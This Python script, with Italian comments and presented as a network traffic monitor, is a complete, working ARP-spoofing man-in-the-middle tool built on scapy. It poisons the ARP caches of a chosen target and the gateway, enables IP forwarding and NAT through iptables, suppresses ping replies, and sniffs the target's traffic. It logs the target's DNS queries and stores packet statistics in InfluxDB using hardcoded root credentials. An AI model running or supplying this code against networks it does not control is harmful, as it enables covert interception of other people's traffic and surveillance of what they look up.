#!/usr/bin/env python3
import optparse 
import threading
import sys, os, random 
from datetime import datetime
from time import sleep

from influxdb import InfluxDBClient
from scapy.config import conf
from scapy.data import ETH_P_ALL
from scapy.layers.dns import DNS
from scapy.layers.inet import TCP, UDP, IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sniff, send, srp

gatewayIP = "192.168.1.1"
targetIP = "192.168.1.3"
interface = "enp2s0"
conf.verb = 0
verbose = False
DEBUG = False
counter = dict(BFS=0, TOT=0, ARP=0, TCP=0, UDP=0, IP=0)


def get_mac_with_arp(ip_address):
    """ restituisce il MAC con ARP Request """
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=4)

    for s, r in responses:
        return r[Ether].src
    return None


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """ ripristinare la rete con le informazioni corrette degli indirizzi MAC """
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, pdst=gateway_ip, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac, pdst=target_ip, psrc=gateway_ip), count=5)
    ip_forward_off()


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, stop):
    """ invia false ARP reply """
    print(" Started ARP poison [CTRL-C to stop]")
    while not stop.is_set():
        # avvelena il target
        send(ARP(op=2, hwdst=gateway_mac, pdst=gateway_ip, psrc=target_ip))
        # avvelena il gateway
        send(ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=gateway_ip))
        stop.wait(random.randrange(10, 40))
    print(" Stopped ARP poison")


def ip_forward_on():
    """ funzione per abilitare l'ip forward """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # disabilita la risposta al ping
    os.system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all")
    # aggiorna le regole del firewall iptables
    os.system("iptables --flush")
    os.system("iptables --append FORWARD --in-interface {} --jump ACCEPT".format(interface))
    os.system("iptables --table nat --append POSTROUTING --out-interface {} --jump MASQUERADE".format(interface))


def ip_forward_off():
    """ funzione per disabilitare l'ip forward """
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    # abilita la risposta al ping
    os.system("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all")
    # pulisce le regole del firewall
    os.system("iptables --flush")


def connectDB(host='localhost', port=8086):
    """ creazione e connessione a influxdb"""
    user = 'root'
    password = 'root'
    dbname = 'packets_db'

    db = InfluxDBClient(host, port, user, password, dbname)
    # db.drop_database(dbname)  # elimina il db
    db.create_database(dbname)
    return db


class Sniffer(threading.Thread):
    """ thread per la cattura e l'aggiornamento di influxdb """
    def __init__(self, interface="eth0", filter=""):
        super().__init__()

        self.daemon = True
        self.bytes = 0
        self.timeout = 10
        self.filter = filter
        self.socket = None
        self.time_list = []
        self.interface = interface
        self.stopper = threading.Event()
        

    def monitor_callback(self, packet):
        """ mostra la query dns del target """
        self.bytes += len(packet)
        self.time_list.append(datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'))
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            res = packet.sprintf(" Target: %IP.src%") + " Search: " + str(packet.getlayer(DNS).qd.qname.decode("utf-8"))
            return res

        if verbose:
            return packet.summary() + packet.sprintf(" %Ether.src% -> %Ether.dst%")

    def run(self):
        try:
            self.db = connectDB()
        except Exception as e:
            print("! Unable to access the database")
            return
        
        self.socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=self.interface,
            filter=self.filter
        )
        while self.isStopped:
            self.bytes = 0
            packets = sniff(
                opened_socket=self.socket,
                prn=self.monitor_callback,
                stop_filter=self.isStopped,
                timeout=self.timeout,
                store=1)
            self.updaterCounterAndSaveDB(packets, self.bytes)

    def updaterCounterAndSaveDB(self, packets, interval_bytes):
        global counter
        counter["TOT"] += len(packets)
        counter["BFS"] = (interval_bytes / self.timeout)
        type = "None"

        for packet, time in zip(packets, self.time_list):
            if UDP in packet:
                type = "UDP"
                counter["UDP"] += 1
            else:
                if TCP in packet:
                    type = "TCP"
                    counter["TCP"] += 1
                else:
                    if ARP in packet:
                        type = "ARP"
                        counter["ARP"] += 1
                    else:
                        if IP in packet:
                            type = "IP"
                            counter["IP"] += 1

            if type != "None":
                # print(packet.summary() + packet.sprintf(" %Ether.src% -> %Ether.dst%"))
                json_body = [
                    {
                        "measurement": "packet_info",
                        "time": time,
                        "tags": {
                            "String_proto": type
                        },
                        "fields": {
                            "Int_packet_tot": counter["TOT"],
                            "Int_packet_for_proto": counter[type],
                            "Float_bytes_for_sec": counter["BFS"],
                            "int_packet_byte": len(packet)
                        }
                    }
                ]
                self.db.write_points(json_body)

    def join(self, timeout=None):
        self.stopper.set()
        super().join(timeout)

    def isStopped(self, packet):
        return self.stopper.isSet()


def set_options():
    global interface, gatewayIP, targetIP, verbose
    parser = optparse.OptionParser(description='Analysis network traffic with arp spoofing', prog='NetworkMonitoring')
    
    parser.add_option('-i', '--interface', help='Interface of capture network traffic')
    parser.add_option('-g', '--gateway', help='Gateway IP of router device')
    parser.add_option('-t', '--target', help='Target IP of device for analysis')
    parser.add_option('-v', '--verbose',action="store_true", default=False, help='Verbose mode')
    parser.add_option('-e', '--example',action="store_true", default=False, dest="example", help='NetworkMonitor.py -i enp2s0 -t 192.168.1.3 -g 192.168.1.1')


    options, args = parser.parse_args()
   
    if options.example:
        print('sudo python3 NetworkMonitor.py -i enp2s0 -t 192.168.1.3 -g 192.168.1.1')
        sys.exit(1)

    interface = options.interface
    gatewayIP = options.gateway
    targetIP = options.target
    verbose = options.verbose


    if not interface or not gatewayIP or not targetIP:
        parser.print_help()
        sys.exit(1)


def printCounter(info):
    print("\n ARP: {} IP: {} TCP: {} UDP: {} TOT: {}".format(info["ARP"], info["IP"], info["TCP"], info["UDP"],
                                                             info["TOT"]))


def main():
    eventClose = threading.Event()

    # if not root...kick out
    if not os.geteuid()==0:
        sys.exit("\n Must be run as root!\n")

    if not DEBUG:
        set_options()
    ip_forward_on()
    print(" Start capturing traffic on {}".format(interface))

    gatewayMac = get_mac_with_arp(gatewayIP)
    if gatewayMac is None:
        print("! Failed to get the gateway's MAC address. closing...")
        sys.exit(1)

    targetMac = get_mac_with_arp(targetIP)
    if targetMac is None:
        print("! Failed to get the target's MAC address. closing...")
        sys.exit(1)

    print(" Gateway IP: {} MAC: {}".format(gatewayIP, gatewayMac))
    print(" Target IP: {} MAC: {}\n".format(targetIP, targetMac))

    poison_thread = threading.Thread(target=arp_poison,
                                     args=(gatewayIP, gatewayMac, targetIP, targetMac, eventClose))
    poison_thread.start()
    sniff_filter = "ether host {}".format(targetMac)

    if verbose:
        print(" Filter capture: {}".format(sniff_filter))
    
    sniffer_thread = Sniffer(interface=interface, filter=sniff_filter)
    sniffer_thread.start()
    
    print(" To access the graphic data go the web page http://localhost:8888")

    try:
        while True:
            sleep(100)
    except KeyboardInterrupt:
        print('\n Request for exit...')

    eventClose.set()
    restore_network(gatewayIP, gatewayMac, targetIP, targetMac)
    sniffer_thread.join(2)
    if sniffer_thread.isAlive():
        try:
            sniffer_thread.socket.close()
        except Exception as e:
            print(e, )

    printCounter(counter)
    sys.exit(0)


if __name__ == '__main__':
    main()
